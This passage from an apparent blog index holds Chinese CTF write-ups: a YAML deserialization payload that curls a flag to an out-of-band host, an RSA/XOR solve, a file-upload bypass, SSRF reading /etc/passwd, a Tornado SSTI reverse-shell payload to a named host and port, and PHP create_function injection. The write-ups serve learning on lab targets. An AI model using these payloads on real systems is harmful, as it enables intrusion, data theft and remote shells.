class="line">#test.yaml</span><br><span class="line">!!python/object/apply:os.system [&#x27;curl http://kbqsag.ceye.io?flag=`cat /fllaagg_here`&#x27;]</span><br></pre></td></tr></table></figure></li><li><p>打包文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar cPvf midi.tar ../../config/test.yaml</span><br></pre></td></tr></table></figure></li><li><p>之后访问<code>/src?username=test</code>，即可成功实现外带。</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web3_1.png"></p></li></ol><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="XOR贯穿始终"><a href="#XOR贯穿始终" class="headerlink" title="XOR贯穿始终"></a>XOR贯穿始终</h2><p>rsa+异或</p><ol><li><p>打开<code>massege.txt</code>，是核心价值观编码，解码后得到压缩包的解压密码。（在线网站：<a href="http://www.hiencode.com/cvencode.html%EF%BC%89">http://www.hiencode.com/cvencode.html）</a></p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/c_1_1.png"></p></li><li><p>解压压缩包后，有一个pem文件是私钥文件，参考这个（<a href="https://zhuanlan.zhihu.com/p/461349946%EF%BC%89,%E5%8D%B3%E5%8F%AF%E5%88%86%E7%A6%BB%E5%87%BAe%EF%BC%8Cp%EF%BC%8Cq%E3%80%82">https://zhuanlan.zhihu.com/p/461349946）,即可分离出e，p，q。</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pri=<span class="string">b&quot;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbILSuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYEN4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuWeZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESvIgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbnjxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaAUETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25uGz3++w==&quot;</span></span><br><span class="line">decode_pri=<span class="built_in">hex</span>(bytes_to_long(base64.b64decode(pri)))</span><br><span class="line"><span class="built_in">print</span>(decode_pri)</span><br><span class="line">e=re.findall(<span class="string">r&#x27;0203([0-9]&#123;6&#125;)&#x27;</span>,decode_pri)</span><br><span class="line">pq=re.findall(<span class="string">r&#x27;0241(\w&#123;130&#125;)&#x27;</span>,decode_pri)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e= 0x&#x27;</span>+e[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p= 0x&#x27;</span>+pq[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q= 0x&#x27;</span>+pq[<span class="number">1</span>]) </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>常规rsa解码，但解码后发现flag后半部分是乱码。</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/c_1_2.png"></p></li><li><p>想到题目提示有XOR，于是将步骤一得到字符串和m异或一遍，最后得到flag。</p></li><li><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pri=<span class="string">b&quot;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbILSuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYEN4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuWeZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESvIgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbnjxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaAUETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25uGz3++w==&quot;</span></span><br><span class="line">decode_pri=<span class="built_in">hex</span>(bytes_to_long(base64.b64decode(pri)))</span><br><span class="line"><span class="comment">#print(decode_pri)</span></span><br><span class="line">e=re.findall(<span class="string">r&#x27;0203([0-9]&#123;6&#125;)&#x27;</span>,decode_pri)</span><br><span class="line">pq=re.findall(<span class="string">r&#x27;0241(\w&#123;130&#125;)&#x27;</span>,decode_pri)</span><br><span class="line"><span class="comment">#print(&#x27;e= 0x&#x27;+e[0])</span></span><br><span class="line"><span class="comment">#print(&#x27;p= 0x&#x27;+pq[0])</span></span><br><span class="line"><span class="comment">#print(&#x27;q= 0x&#x27;+pq[1]) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line"><span class="comment">#填p</span></span><br><span class="line">p = <span class="built_in">int</span>(pq[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#填q</span></span><br><span class="line">q = <span class="built_in">int</span>(pq[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment">#填c</span></span><br><span class="line">c=<span class="number">91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">xor=bytes_to_long(<span class="string">b&#x27;C0ngr4tulati0n5_y0u_fou^d_m3&#x27;</span>)</span><br><span class="line">flag = long_to_bytes(m^xor)</span><br><span class="line"><span class="comment">#flag = long_to_bytes(m)</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;0e2874af5e422482378640e61d919e9a&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF_2nd_WP</title>
      <link href="/NSSCTF_2nd_WP/"/>
      <url>/NSSCTF_2nd_WP/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="php签到"><a href="#php签到" class="headerlink" title="php签到"></a>php签到</h2><p>一个文件上传的题目，重点在绕<code>pathinfo($filename, PATHINFO_EXTENSION)</code>。</p><p>参考链接：<a href="https://blog.csdn.net/weixin_44532761/article/details/121603082">2021&#x2F;11&#x2F;29文件上传-内容及其它逻辑数组绕过</a></p><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&quot;ph&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Please re-upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要自备一个上传的前端。</p><p>上传时，上传的文件名为<code>xxx.php/.</code>，即可让<code>$ext</code>的值为空，从而绕过waf。需要注意的是，要对文件名来一次url编码，不然会出错。（题目对文件名来了一个<code>urldecode</code>也算是一个提醒吧）。flag就在环境变量里。</p><p><img src="/NSSCTF_2nd_WP/1_1.png" alt="上传时"></p><p><img src="/NSSCTF_2nd_WP/1_2.png" alt="上传成功"></p><h2 id="2周年快乐！"><a href="#2周年快乐！" class="headerlink" title="2周年快乐！"></a>2周年快乐！</h2><p>纯前端的win12，要和出题人对个脑洞（</p><ol><li><p>在D盘的<code>NSSCTF_2nd_WriteUp</code>文件夹里里发现一个hint。</p><p><img src="/NSSCTF_2nd_WP/2_1.png"></p></li><li><p>在桌面的获取FLAG中得到另一个有用的信息。</p><p><img src="/NSSCTF_2nd_WP/2_2.png"></p></li><li><p>结合上述条件，可以猜测是在终端里执行<code>curl https://www.nssctf.cn/flag</code>。</p></li><li><p>打开终端，输入队伍的<code>token</code>，然后输入<code>curl https://www.nssctf.cn/flag</code>，即可将flag发到队长的站内邮箱里，去查看站内消息就能看到flag了。</p><p><img src="/NSSCTF_2nd_WP/2_3.png"></p><p><img src="/NSSCTF_2nd_WP/2_4.png"></p></li></ol><h2 id="MyBox"><a href="#MyBox" class="headerlink" title="MyBox"></a>MyBox</h2><p>这个题存在非预期，用到非预期做的。</p><ol><li><p>打开题目，只看到一个<code>/?url=dosth</code>。</p></li><li><p>猜测是ssrf，使用file协议尝试读文件，发现能读。<code>/?url=file:///etc/passwd</code></p><p><img src="/NSSCTF_2nd_WP/3_1.png"></p></li><li><p>读<code>/proc/1/environ</code>，即可得到flag。</p><p><img src="/NSSCTF_2nd_WP/3_2.png"></p></li></ol><h2 id="MyHurricane"><a href="#MyHurricane" class="headerlink" title="MyHurricane"></a>MyHurricane</h2><p>tornado的ssti，狠狠地学习了一波。</p><p>参考链接：<a href="https://blog.csdn.net/miuzzx/article/details/123329244">tornado模板注入</a></p><p>​   <a href="https://tornado-zh.readthedocs.io/zh/latest/index.html">Tornado 官方文档</a></p><ol><li><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    bl = [<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> bl:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> data.split():</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chunk:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">31</span> &lt; <span class="built_in">ord</span>(c) &lt; <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IndexHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            self.finish(f.read())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        data = self.get_argument(<span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(data):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;&quot;&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string">                        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">                        &lt;body style=&quot;font-size: 30px;&quot;&gt;<span class="subst">&#123;data&#125;</span>&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span>)</span><br><span class="line">                f.flush()</span><br><span class="line">            self.render(<span class="string">&#x27;1.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.finish(<span class="string">&#x27;no no no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">            (<span class="string">r&quot;/&quot;</span>, IndexHandler),</span><br><span class="line">        ], compiled_template_cache=<span class="literal">False</span>)</span><br><span class="line">    app.listen(<span class="number">827</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure></li><li><p>从源码可以看到，post的<code>ssti</code>参数那里存在ssti。</p></li><li><p>过滤了<code>&#123;&#123;`、`&#125;&#125;</code>、<code>(</code>、<code>)</code>、单双引号，极其麻烦。</p></li><li><p>先学习一波，学习的时候在本地调试，可以发现在无过滤的情况下，该ssti是可以直接执行<code>eval</code>的，但在前端是没有回显的，只返回500，但能在后台执行命令。</p><p><img src="/NSSCTF_2nd_WP/4_1.png"></p><p><img src="/NSSCTF_2nd_WP/4_2.png"></p></li><li><p>由于过滤了一些东西，我们需要做一些替换，用<code>&#123;% %&#125;</code>代替<code>&#123;&#123; &#125;&#125;</code>，在文章的下面我们还看到能绕小括号的方法。</p><p><img src="/NSSCTF_2nd_WP/4_3.png"></p></li><li><p>由此我们可以发现，我们可以不用括号执行<code>eval</code>，而前面的<code>&#39;print(123)&#39;</code>是<code>eval</code>的参数，那么我们从别处接收到参数，即可绕过小括号的限制。</p></li><li><p>在文章的中间讲了<code>request</code>的用法，因此我们可以利用<code>request</code>来传递<code>eval</code>的参数。</p><p><img src="/NSSCTF_2nd_WP/4_4.png"></p></li><li><p>我们在本地尝试用<code>request.query</code>，发现能成功执行命令。</p><p><img src="/NSSCTF_2nd_WP/4_5.png"></p><p><img src="/NSSCTF_2nd_WP/4_6.png"></p></li><li><p>从上边的调试中，我们成功突破了限制，在服务器执行了命令，接下来能成功反弹shell就行了。</p></li><li><p>在文章的末尾，我们看到了一个这样的payload，我们直接拿来用就行了</p><p><img src="/NSSCTF_2nd_WP/4_7.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1&#x27;)%0a&quot;&quot;&quot;%0a&amp;data=&#123;%autoescape None%&#125;&#123;% raw request.body%0a    _tt_utf8=exec%&#125;&amp;%0a&quot;&quot;&quot;</span><br></pre></td></tr></table></figure></li><li><p>我们修改一下，把%0a替换成回车，把<code>data</code>替换成<code>ssti</code>，再填上反弹服务器的地址和端口，即可成功反弹shell。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).system(&#x27;bash -c \&#x27;bash -i &gt;&amp; /dev/tcp/7654du6216.zicp.fun/33699 0&gt;&amp;1\&#x27;&#x27;)</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&amp;ssti=&#123;%autoescape None%&#125;&#123;% raw request.body%0a    _tt_utf8=exec%&#125;&amp;</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure><p><img src="/NSSCTF_2nd_WP/4_8.png"></p></li><li><p>解释一下payload，<code>&#123;%autoescape None%&#125;&#123;%raw ...%&#125;</code>可以等同于<code>&#123;&#123; &#125;&#125;</code>，这个在官方文档中有写。</p><p><img src="/NSSCTF_2nd_WP/4_9.png"></p></li><li><p><code>request.body</code>返回的是请求的主体，可以理解为返回了post里的所有内容。而下面的<code>&quot;&quot;&quot;</code>则是起注释作用，把我们不需要的部分注释掉，防止出错。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> NSSCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> NSSCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow红包挑战7_WP</title>
      <link href="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/"/>
      <url>/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/</url>
      
        <content type="html"><![CDATA[<p>赛后复现</p><p>官方wp：<a href="https://ctf-show.feishu.cn/docx/IZh0deravoLG66xCrJ6caezNnKc">https://ctf-show.feishu.cn/docx/IZh0deravoLG66xCrJ6caezNnKc</a></p><h1 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(</span><br><span class="line">    <span class="string">&quot;ls &#x27;&quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]).<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2、题目解析"><a href="#2、题目解析" class="headerlink" title="2、题目解析"></a>2、题目解析</h1><p>1.存在<code>extract($_GET);</code>可以变量覆盖，<code>ini_set</code>可以修改<code>php.ini</code>的部分配置信息，<code>filter</code>函数将 ‘ （单引号）、 \ （反斜杠）、&#96; (反引号) 、$ 都替换成空。</p><p>2.常规思路是闭合掉 ‘ （单引号）,然后利用 ; （分号）执行其他bash命令，但 ‘ （单引号）用不了，无法闭合，因此此方法不行。</p><p>3.修改<code>error_log</code>的保存路径为<code>/var/www/html/3.php</code>，利用报错将报错信息写入，在报错信息中包含想要执行的php代码，从而实现getshell。</p><p>4.<code>system</code>刚好可以用0字节进行截断来触发异常，在异常中加入php代码。</p><p><img src="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/1.png"></p><p>5.之后访问<code>3.php</code>，即可看到flag。</p><p><img src="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%987-WP/2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 红包挑战 </category>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow红包挑战8_WP</title>
      <link href="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/"/>
      <url>/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/</url>
      
        <content type="html"><![CDATA[<p>官方WP：<a href="https://ctf-show.feishu.cn/docx/Uy3xdlo9koLQtyxnlUGcpIxunUh?from=from_copylink">https://ctf-show.feishu.cn/docx/Uy3xdlo9koLQtyxnlUGcpIxunUh?from=from_copylink</a></p><h1 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$name</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>))();</span><br></pre></td></tr></table></figure><h1 id="2、分析过程："><a href="#2、分析过程：" class="headerlink" title="2、分析过程："></a>2、分析过程：</h1><ol><li><code>extract($_GET);</code>能够实现变量覆盖，可以给<code>$name</code>和<code>$value</code>赋值。</li><li>存在<code>create_function</code>函数，可以通过这个实现rce。</li><li>若不存在<code>base64_encode</code>则可以通过<code>$value</code>实现rce，由于<code>$value</code>被<code>base64_encode</code>破坏，导致不可控，因此可以考虑使用<code>$name</code>。</li><li>参考这篇博客 <a href="https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22116244642%22,%22source%22:%22m0_74044466%22%7D&fromshare=blogdetail">匿名函数create_function()代码注入</a> ，只要<code>create_function</code>的形参有一个可控，都能执行php代码。</li></ol><h1 id="3、create-function"><a href="#3、create-function" class="headerlink" title="3、create_function"></a>3、<code>create_function</code></h1><p>对于<code>create_function</code>函数，不能把它当成一个普通的函数看待，而是应该当成一个函数的定义过程。</p><p>比如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">等同于</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxxx</span>(<span class="params">   <span class="variable">$a</span>   </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line">其中xxxx为匿名函数的函数名，<span class="variable">$a</span>为形参，<span class="variable">$b</span>为函数内执行的代码</span><br></pre></td></tr></table></figure><p>由此我们可以想，提前闭合<code>create_function</code>，结束这个函数，那么不久能将php代码逃逸出来了么</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>( <span class="variable">$a</span> , <span class="variable">$b</span> );</span><br><span class="line">若<span class="variable">$a</span>=<span class="string">&quot;)&#123;&#125;phpinfo();/*&quot;</span></span><br><span class="line">则等同于</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxxx</span>(<span class="params">      </span>)</span>&#123;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*      )</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">$b;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><p>可以发现<code>phpinfo</code>逃了出来，为了不报错，使用<code>/*</code>（或者<code>//</code>）把后面的所有代码都注释掉，由此可以实现rce。</p><h1 id="4、payload"><a href="#4、payload" class="headerlink" title="4、payload"></a>4、payload</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=)&#123;&#125;system(&quot;cat /f*&quot;);//</span><br></pre></td></tr></table></figure><p><img src="/ctfshow%E7%BA%A2%E5%8C%85%E6%8C%91%E6%88%988-WP/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 红包挑战 </category>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>※CTF</title>
      <link href="/%E2%80%BBCTF/"/>
      <url>/%E2%80%BBCTF/</url>
      
